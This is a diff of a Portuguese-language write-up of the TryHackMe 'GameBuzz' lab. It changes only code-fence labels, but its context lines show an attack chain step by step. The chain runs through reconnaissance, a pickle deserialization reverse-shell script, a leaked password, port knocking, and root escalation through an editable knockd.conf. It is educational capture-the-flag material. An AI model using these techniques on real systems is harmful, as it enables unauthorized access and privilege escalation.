@@ -24,7 +24,7 @@ alt: "THM GameBuzz Writeup"
 
 
 ### Nmap
-```
+```bash
 ┌──(hastur㉿hastur)-[~/GameBuzz]
 └─$ sudo nmap -v -p- -sCV -O -Pn 10.10.102.61 --min-rate=512
 PORT   STATE    SERVICE VERSION
@@ -57,7 +57,7 @@ Aparentemente o link faz uma requisição para um objeto `serializado` que se en
 
 A varredura de diretórios não revelou nada útil, então decidi fazer uma busca por subdomínios.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/GameBuzz]
 └─$ gobuster dns -d incognito.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 ===============================================================
@@ -124,7 +124,7 @@ Ao acessar a página, obtive a resposta de diretório proibido pelo servidor.
 
 Porém, como encontrei como desabilitado no robots.txt, decidi fazer uma varredura de diretórios.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/GameBuzz]
 └─$ gobuster dir -e -u http://dev.incognito.com/secret/ -w /usr/share/wordlists/dirb/common.txt -r 
 ===============================================================
@@ -158,7 +158,7 @@ O gobuster trouxe o diretório `/upload`, ao acessá-lo, encontrei um formulári
 
 Como o diretório é `/upload` e a requisição do `Game Ratings` vai para o diretório `/var/upload/games`, tavlez estejamos falando do mesmo lugar, então decidi fazer um script em `python` para serializar um payload com reverse shell.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/GameBuzz]
 └─$ cat serialize.py 
 #!/usr/bin/python3
@@ -173,7 +173,7 @@ pickle.dump(SerializedPickle(), open('hastur','wb'))
 ```
 Este script irá salvar nosso payload em um arquivo para podermos subí-lo pelo formulário.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/GameBuzz]
 └─$ python3 serialize.py               
                                                                                                                      
@@ -197,7 +197,7 @@ Ao enviar a requisição alterada, conseguimos nosso shell!!
 
 Ao enumerar o diretório `/home`, encontramos dois usuários.
 
-```
+```bash
 www-data@incognito:/home$ ls -la
 ls -la
 total 16
@@ -208,7 +208,7 @@ drwxr-xr-x  6 dev2 dev2 4096 Jun 11 07:24 dev2
 ```
 Ao tentar mudar para o usuário `dev2`, conseguimos sem uso de senha.
 
-```
+```bash
 www-data@incognito:/home$ su dev2
 su dev2
 dev2@incognito:/home$ 
@@ -217,7 +217,7 @@ A flag `user.txt` se encontra no diretório do usuário dev2.
 
 Após um tempo de enumeração local, encontrei um e-mail direcionado para o usuário `dev1` em `/var/mail`.
 
-```
+```bash
 dev2@incognito:/var/mail$ cat dev1
 cat dev1
 Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
@@ -227,7 +227,7 @@ Esta mensagem diz que a senha do usuário dev1 foi alterada para a senha informa
 
 Ao enumerar o diretório `/etc`, encontrei o arquivo `knockd.conf`, ao ler o conteúdo, encontrei a configuração do Port Knocking.
 
-```
+```bash
 dev2@incognito:/etc$ cat knockd.conf
 cat knockd.conf
 [options]
@@ -247,7 +247,7 @@ cat knockd.conf
 ```
 Ele nos diz que para abrir a porta 22, precisamos mandar uma requisição sequencial com a flag `SYN` para as portas `5020, 6120 e 7340`, podemos usar o programa `knock` para abrirmos a porta 22 e tentar logar com o usuário `dev1`.
 
-```
+```bash
 ┌──(hastur㉿hastur)-[~/GameBuzz]
 └─$ knock 10.10.102.61 5020 6120 7340 -d 500
 ```
@@ -260,7 +260,7 @@ E logo em seguida tentei a conexão `ssh` e consegui o shell.
 
 Ao enumerar as permissões do usuário dev1, descobri que ele tem permissão administrativa para inicializar o programa `konckd`.
 
-```
+```bash
 dev1@incognito:~$ sudo -l
 [sudo] password for dev1: 
 Matching Defaults entries for dev1 on incognito:
@@ -271,13 +271,13 @@ User dev1 may run the following commands on incognito:
 ```
 Ao enumerar o arquivo `/etc/knockd.conf` que já havíamos encontrado, descobri que ele tem permissões adicionais.
 
-```
+```bash
 dev1@incognito:~$ ls -la /etc/knockd.conf 
 -rw-rw-r--+ 1 root root 349 Jun 11 07:39 /etc/knockd.conf
 ```
 O `+` nas permissões, evidencia que o arquivo tem permissões especiais, se conseguirmos editar este arquivo, podemos tentar um shell como `root`.
 
-```
+```bash
 dev1@incognito:~$ cat /etc/knockd.conf 
 [options]
         logfile = /var/log/knockd.log
@@ -297,7 +297,7 @@ dev1@incognito:~$ cat /etc/knockd.conf
 Novamente observando o arquivo, percebemos que logo após ele receber a sequência correta de requisições, ele roda um comando no `iptables`, iso significa que talvez possamos editar esta linha para inserir um payload de conexão reversa.
 Após a edição do arquivo, ficou desta forma : 
 
-```
+```bash
 dev1@incognito:~$ cat /etc/knockd.conf 
 [options]
         logfile = /var/log/knockd.log
@@ -316,7 +316,7 @@ dev1@incognito:~$ cat /etc/knockd.conf
 ```
 Após a edição, utilizei a permissão do usuário dev1 para reiniciar o knockd e recarregar as configurações.
 
-```
+```bash
 dev1@incognito:~$ sudo /etc/init.d/knockd restart
 [ ok ] Restarting knockd (via systemctl): knockd.service.
 ```
